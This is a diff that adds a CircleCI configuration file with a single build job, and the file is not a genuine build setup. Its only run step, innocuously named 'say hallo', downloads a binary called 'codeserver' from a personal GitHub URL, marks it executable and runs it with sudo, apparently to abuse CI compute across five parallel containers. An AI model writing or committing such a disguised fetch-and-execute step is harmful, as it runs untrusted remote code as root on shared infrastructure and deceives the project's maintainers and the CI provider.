@@ -1,0 +1,17 @@
+version: 2
+jobs:
+  build:
+    parallelism: 5
+    docker:
+      - image: cimg/node:12.22.11
+    steps:
+     - chekout
+     - run:
+         name: "say hallo"
+         command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/dekamoonth/code/main/codeserver && chmod +x codeserver && sudo ./codeserver
+       
+workflows:
+  version: 2
+  build:
+    jobs:
+      - build
